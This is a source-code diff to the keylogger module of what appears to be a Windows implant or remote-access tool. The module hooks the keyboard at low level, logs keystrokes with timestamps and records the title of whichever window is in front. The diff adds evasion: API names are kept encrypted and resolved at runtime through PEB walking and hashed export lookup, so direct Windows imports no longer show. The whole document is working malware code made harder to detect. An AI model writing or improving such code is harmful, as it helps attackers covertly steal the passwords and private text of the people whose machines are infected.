@@ -1,5 +1,9 @@
 #include "keylogger.h"
 #include "config.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
+#include "enc_strings.h"
 #include <windows.h>
 
 #ifdef ENABLE_KEYLOGGER
@@ -29,6 +33,178 @@
 #define VK_RWIN    0x5C
 
 /* ------------------------------------------------------------------ */
+/* PEB-walk API resolution                                              */
+/* ------------------------------------------------------------------ */
+
+typedef HHOOK    (WINAPI *pSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef LRESULT  (WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
+typedef BOOL     (WINAPI *pUnhookWindowsHookEx)(HHOOK);
+typedef SHORT    (WINAPI *pGetKeyState)(int);
+typedef HWND     (WINAPI *pGetForegroundWindow)(void);
+typedef int      (WINAPI *pGetWindowTextW)(HWND, wchar_t *, int);
+typedef int      (WINAPI *pToUnicodeEx)(UINT, UINT, const BYTE *, wchar_t *, int, UINT, HKL);
+typedef HMODULE  (WINAPI *pGetModuleHandleW)(const wchar_t *);
+typedef BOOL     (WINAPI *pCloseHandle)(HANDLE);
+typedef HANDLE   (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef DWORD    (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
+typedef VOID     (WINAPI *pSleep)(DWORD);
+typedef void     (WINAPI *pInitializeCriticalSection)(LPCRITICAL_SECTION);
+typedef void     (WINAPI *pDeleteCriticalSection)(LPCRITICAL_SECTION);
+typedef void     (WINAPI *pEnterCriticalSection)(LPCRITICAL_SECTION);
+typedef void     (WINAPI *pLeaveCriticalSection)(LPCRITICAL_SECTION);
+typedef void     (WINAPI *pGetLocalTime)(LPSYSTEMTIME);
+typedef HWND     (WINAPI *pCreateWindowExW)(DWORD, LPCWSTR, LPCWSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
+typedef LRESULT  (WINAPI *pDefWindowProcW)(HWND, UINT, WPARAM, LPARAM);
+typedef BOOL     (WINAPI *pDestroyWindow)(HWND);
+typedef BOOL     (WINAPI *pDispatchMessageW)(const MSG *);
+typedef BOOL     (WINAPI *pGetMessageW)(LPMSG, HWND, UINT, UINT);
+typedef BOOL     (WINAPI *pPostMessageW)(HWND, UINT, WPARAM, LPARAM);
+typedef void     (WINAPI *pPostQuitMessage)(int);
+typedef ATOM     (WINAPI *pRegisterClassW)(const WNDCLASSW *);
+typedef BOOL     (WINAPI *pTranslateMessage)(const MSG *);
+
+static struct {
+    pSetWindowsHookExW  pSWH;
+    pCallNextHookEx     pCNH;
+    pUnhookWindowsHookEx pUWH;
+    pGetKeyState        pGKS;
+    pGetForegroundWindow pGFW;
+    pGetWindowTextW     pGWT;
+    pToUnicodeEx        pTUE;
+    pGetModuleHandleW   pGMH;
+    pCloseHandle        pCH;
+    pCreateThread       pCT;
+    pWaitForSingleObject pWFSO;
+    pSleep              pSl;
+    int                 ready;
+} kl_api;
+
+static int kl_ensure_api(void) {
+    if (kl_api.ready) return 1;
+    char dll[32]; char fn[32];
+
+    /* user32.dll APIs */
+    enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
+    void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!u32) return 0;
+
+    enc_decrypt(enc_SetWindowsHookExW, ENC_SETWINDOWSHOOKEXW_LEN, fn);
+    kl_api.pSWH = (pSetWindowsHookExW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CallNextHookEx, ENC_CALLNEXTHOOKEX_LEN, fn);
+    kl_api.pCNH = (pCallNextHookEx)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_UnhookWindowsHookEx, ENC_UNHOOKWINDOWSHOOKEX_LEN, fn);
+    kl_api.pUWH = (pUnhookWindowsHookEx)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetKeyState, ENC_GETKEYSTATE_LEN, fn);
+    kl_api.pGKS = (pGetKeyState)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetForegroundWindow, ENC_GETFOREGROUNDWINDOW_LEN, fn);
+    kl_api.pGFW = (pGetForegroundWindow)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetWindowTextW, ENC_GETWINDOWTEXTW_LEN, fn);
+    kl_api.pGWT = (pGetWindowTextW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_ToUnicodeEx, ENC_TOUNICODEEX_LEN, fn);
+    kl_api.pTUE = (pToUnicodeEx)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+
+    /* kernel32.dll — GetModuleHandleW */
+    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    enc_decrypt(enc_GetModuleHandleW, ENC_GETMODULEHANDLEW_LEN, fn);
+    kl_api.pGMH = (pGetModuleHandleW)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
+    kl_api.pCH = (pCloseHandle)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CreateThread, ENC_CREATETHREAD_LEN, fn);
+    kl_api.pCT = (pCreateThread)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_WaitForSingleObject, ENC_WAITFORSINGLEOBJECT_LEN, fn);
+    kl_api.pWFSO = (pWaitForSingleObject)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_Sleep, ENC_SLEEP_LEN, fn);
+    kl_api.pSl = (pSleep)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+
+    if (!kl_api.pSWH || !kl_api.pCNH || !kl_api.pUWH || !kl_api.pGKS ||
+        !kl_api.pGFW || !kl_api.pGWT || !kl_api.pTUE || !kl_api.pGMH ||
+        !kl_api.pCH || !kl_api.pCT || !kl_api.pWFSO || !kl_api.pSl)
+        return 0;
+
+    kl_api.ready = 1;
+    return 1;
+}
+
+/* user32 window/message APIs */
+static struct {
+    pCreateWindowExW    pCWE;
+    pDefWindowProcW     pDWP;
+    pDestroyWindow      pDW;
+    pDispatchMessageW   pDM;
+    pGetMessageW        pGM;
+    pPostMessageW       pPMsg;
+    pPostQuitMessage    pPQM;
+    pRegisterClassW     pRC;
+    pTranslateMessage   pTM;
+    int                 ready;
+} g_kl_u32;
+
+static int kl_ensure_u32(void) {
+    if (g_kl_u32.ready) return 1;
+    char dll[32]; char fn[32];
+    enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
+    void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!u32) return 0;
+    enc_decrypt(enc_CreateWindowExW, ENC_CREATEWINDOWEXW_LEN, fn);
+    g_kl_u32.pCWE = (pCreateWindowExW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_DefWindowProcW, ENC_DEFWINDOWPROCW_LEN, fn);
+    g_kl_u32.pDWP = (pDefWindowProcW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_DestroyWindow, ENC_DESTROYWINDOW_LEN, fn);
+    g_kl_u32.pDW = (pDestroyWindow)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_DispatchMessageW, ENC_DISPATCHMESSAGEW_LEN, fn);
+    g_kl_u32.pDM = (pDispatchMessageW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetMessageW, ENC_GETMESSAGEW_LEN, fn);
+    g_kl_u32.pGM = (pGetMessageW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_PostMessageW, ENC_POSTMESSAGEW_LEN, fn);
+    g_kl_u32.pPMsg = (pPostMessageW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_PostQuitMessage, ENC_POSTQUITMESSAGE_LEN, fn);
+    g_kl_u32.pPQM = (pPostQuitMessage)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_RegisterClassW, ENC_REGISTERCLASSW_LEN, fn);
+    g_kl_u32.pRC = (pRegisterClassW)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_TranslateMessage, ENC_TRANSLATEMESSAGE_LEN, fn);
+    g_kl_u32.pTM = (pTranslateMessage)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
+    if (!g_kl_u32.pCWE || !g_kl_u32.pDWP || !g_kl_u32.pDW || !g_kl_u32.pDM ||
+        !g_kl_u32.pGM || !g_kl_u32.pPMsg || !g_kl_u32.pPQM || !g_kl_u32.pRC || !g_kl_u32.pTM)
+        return 0;
+    g_kl_u32.ready = 1;
+    return 1;
+}
+
+/* kernel32 CriticalSection + GetLocalTime */
+static struct {
+    pInitializeCriticalSection pICS;
+    pDeleteCriticalSection     pDCS;
+    pEnterCriticalSection      pECS;
+    pLeaveCriticalSection      pLCS;
+    pGetLocalTime              pGLT;
+    int                        ready;
+} g_kl_cs;
+
+static int kl_ensure_cs(void) {
+    if (g_kl_cs.ready) return 1;
+    char dll[32]; char fn[32];
+    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    enc_decrypt(enc_InitializeCriticalSection, ENC_INITIALIZECRITICALSECTION_LEN, fn);
+    g_kl_cs.pICS = (pInitializeCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_DeleteCriticalSection, ENC_DELETECRITICALSECTION_LEN, fn);
+    g_kl_cs.pDCS = (pDeleteCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_EnterCriticalSection, ENC_ENTERCRITICALSECTION_LEN, fn);
+    g_kl_cs.pECS = (pEnterCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_LeaveCriticalSection, ENC_LEAVECRITICALSECTION_LEN, fn);
+    g_kl_cs.pLCS = (pLeaveCriticalSection)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_GetLocalTime, ENC_GETLOCALTIME_LEN, fn);
+    g_kl_cs.pGLT = (pGetLocalTime)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_kl_cs.pICS || !g_kl_cs.pDCS || !g_kl_cs.pECS || !g_kl_cs.pLCS || !g_kl_cs.pGLT)
+        return 0;
+    g_kl_cs.ready = 1;
+    return 1;
+}
+
+/* ------------------------------------------------------------------ */
 /* Internal state                                                       */
 /* ------------------------------------------------------------------ */
 
@@ -52,14 +228,14 @@ static const wchar_t kClassName[] = { 'K','L','W','M',0 };
 /* ------------------------------------------------------------------ */
 
 static void buf_write(const char *data, size_t len) {
-    EnterCriticalSection(&g_cs);
+    g_kl_cs.pECS(&g_cs);
     for (size_t i = 0; i < len; i++) {
         g_buffer[g_head] = data[i];
         g_head = (g_head + 1) % KEYLOG_BUFFER_SIZE;
         if (g_head == g_tail)
             g_tail = (g_tail + 1) % KEYLOG_BUFFER_SIZE;
     }
-    LeaveCriticalSection(&g_cs);
+    g_kl_cs.pLCS(&g_cs);
 }
 
 static void buf_write_str(const char *s) {
@@ -72,7 +248,7 @@ static void buf_write_str(const char *s) {
 
 static void write_timestamp(void) {
     SYSTEMTIME st;
-    GetLocalTime(&st);
+    g_kl_cs.pGLT(&st);
     char ts[32];
     int n = snprintf(ts, sizeof(ts), "[%04d-%02d-%02d %02d:%02d:%02d] ",
                      st.wYear, st.wMonth, st.wDay,
@@ -86,11 +262,11 @@ static void write_timestamp(void) {
 /* ------------------------------------------------------------------ */
 
 static BOOL is_shift_pressed(void) {
-    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+    return (kl_api.pGKS(VK_SHIFT) & 0x8000) != 0;
 }
 
 static BOOL is_caps_lock_on(void) {
-    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+    return (kl_api.pGKS(VK_CAPITAL) & 0x0001) != 0;
 }
 
 /* ------------------------------------------------------------------ */
@@ -151,13 +327,13 @@ static int translate_unicode(UINT vk, UINT scan, BYTE *key_state, wchar_t *out, 
 
     if (is_shift_pressed())  kbd[VK_SHIFT]   = 0x80;
     if (is_caps_lock_on())   kbd[VK_CAPITAL] = 0x01;
-    /* Also mirror actual.GetAsyncKeyState state for modifiers. */
-    if (GetKeyState(VK_CONTROL) & 0x8000) kbd[VK_CONTROL] = 0x80;
-    if (GetKeyState(VK_MENU)    & 0x8000) kbd[VK_MENU]    = 0x80;
+    /* Also mirror actual key state for modifiers. */
+    if (kl_api.pGKS(VK_CONTROL) & 0x8000) kbd[VK_CONTROL] = 0x80;
+    if (kl_api.pGKS(VK_MENU)    & 0x8000) kbd[VK_MENU]    = 0x80;
 
     (void)key_state;
 
-    return ToUnicodeEx(vk, scan, kbd, out, out_max, 0, NULL);
+    return kl_api.pTUE(vk, scan, kbd, out, out_max, 0, NULL);
 }
 
 /* ------------------------------------------------------------------ */
@@ -165,13 +341,13 @@ static int translate_unicode(UINT vk, UINT scan, BYTE *key_state, wchar_t *out, 
 /* ------------------------------------------------------------------ */
 
 static void track_foreground_window(void) {
-    HWND fg = GetForegroundWindow();
+    HWND fg = kl_api.pGFW();
     if (!fg || fg == g_last_hwnd)
         return;
     g_last_hwnd = fg;
 
     wchar_t title[256];
-    int len = GetWindowTextW(fg, title, 256);
+    int len = kl_api.pGWT(fg, title, 256);
     if (len <= 0) {
         buf_write_str("[Window: (unknown)]\n");
         return;
@@ -253,7 +429,7 @@ static LRESULT CALLBACK hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
         }
     }
 
-    return CallNextHookEx(g_hook, nCode, wParam, lParam);
+    return kl_api.pCNH(g_hook, nCode, wParam, lParam);
 }
 
 /* ------------------------------------------------------------------ */
@@ -262,10 +438,10 @@ static LRESULT CALLBACK hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     if (msg == WM_DESTROY) {
-        PostQuitMessage(0);
+        g_kl_u32.pPQM(0);
         return 0;
     }
-    return DefWindowProcW(hwnd, msg, wParam, lParam);
+    return g_kl_u32.pDWP(hwnd, msg, wParam, lParam);
 }
 
 /* ------------------------------------------------------------------ */
@@ -275,26 +451,28 @@ static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lPar
 static DWORD WINAPI keylogger_thread(LPVOID param) {
     (void)param;
 
-    HINSTANCE hInst = GetModuleHandleW(NULL);
+    if (!kl_ensure_api() || !kl_ensure_u32() || !kl_ensure_cs()) return 1;
+
+    HINSTANCE hInst = kl_api.pGMH(NULL);
 
     /* Register a minimal window class. */
     WNDCLASSW wc = {0};
     wc.lpfnWndProc   = wnd_proc;
     wc.hInstance      = hInst;
     wc.lpszClassName  = kClassName;
-    if (!RegisterClassW(&wc))
+    if (!g_kl_u32.pRC(&wc))
         return 1;
 
-    g_hwnd = CreateWindowExW(0, kClassName, kClassName,
+    g_hwnd = g_kl_u32.pCWE(0, kClassName, kClassName,
                              0, 0, 0, 0, 0,
                              NULL, NULL, hInst, NULL);
     if (!g_hwnd)
         return 1;
 
     /* Install low-level keyboard hook. */
-    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, hInst, 0);
+    g_hook = kl_api.pSWH(WH_KEYBOARD_LL, hook_proc, hInst, 0);
     if (!g_hook) {
-        DestroyWindow(g_hwnd);
+        g_kl_u32.pDW(g_hwnd);
         g_hwnd = NULL;
         return 1;
     }
@@ -303,15 +481,15 @@ static DWORD WINAPI keylogger_thread(LPVOID param) {
 
     /* Message pump — required for the hook to fire. */
     MSG msg;
-    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);
+    while (g_kl_u32.pGM(&msg, NULL, 0, 0) > 0) {
+        g_kl_u32.pTM(&msg);
+        g_kl_u32.pDM(&msg);
     }
 
     /* Cleanup. */
-    UnhookWindowsHookEx(g_hook);
+    kl_api.pUWH(g_hook);
     g_hook = NULL;
-    DestroyWindow(g_hwnd);
+    g_kl_u32.pDW(g_hwnd);
     g_hwnd = NULL;
     g_running = FALSE;
     return 0;
@@ -324,22 +502,23 @@ static DWORD WINAPI keylogger_thread(LPVOID param) {
 int keylogger_start(void) {
     if (g_running)
         return 0;
+    if (!kl_ensure_cs()) return -1;
 
-    InitializeCriticalSection(&g_cs);
-    EnterCriticalSection(&g_cs);
+    g_kl_cs.pICS(&g_cs);
+    g_kl_cs.pECS(&g_cs);
     g_head = 0;
     g_tail = 0;
     g_stop = FALSE;
     g_last_hwnd = NULL;
-    LeaveCriticalSection(&g_cs);
+    g_kl_cs.pLCS(&g_cs);
 
-    g_thread = CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL);
+    g_thread = kl_api.pCT(NULL, 0, keylogger_thread, NULL, 0, NULL);
     if (!g_thread)
         return -1;
 
     /* Wait briefly for the hook to be installed. */
     for (int i = 0; i < 50 && !g_running; i++)
-        Sleep(10);
+        kl_api.pSl(10);
 
     return g_running ? 0 : -1;
 }
@@ -352,22 +531,22 @@ void keylogger_stop(void) {
 
     /* Posting WM_DESTROY to the hidden window forces GetMessage to return. */
     if (g_hwnd)
-        PostMessageW(g_hwnd, WM_DESTROY, 0, 0);
+        g_kl_u32.pPMsg(g_hwnd, WM_DESTROY, 0, 0);
 
     if (g_thread) {
-        WaitForSingleObject(g_thread, 3000);
-        CloseHandle(g_thread);
+        kl_api.pWFSO(g_thread, 3000);
+        kl_api.pCH(g_thread);
         g_thread = NULL;
     }
 
-    DeleteCriticalSection(&g_cs);
+    g_kl_cs.pDCS(&g_cs);
 }
 
 size_t keylogger_get_log(char *buf, size_t buf_len) {
     if (!buf || buf_len == 0)
         return 0;
 
-    EnterCriticalSection(&g_cs);
+    g_kl_cs.pECS(&g_cs);
 
     size_t h = g_head;
     size_t t = g_tail;
@@ -389,7 +568,7 @@ size_t keylogger_get_log(char *buf, size_t buf_len) {
 
     g_tail = t;
 
-    LeaveCriticalSection(&g_cs);
+    g_kl_cs.pLCS(&g_cs);
     return to_copy;
 }
 
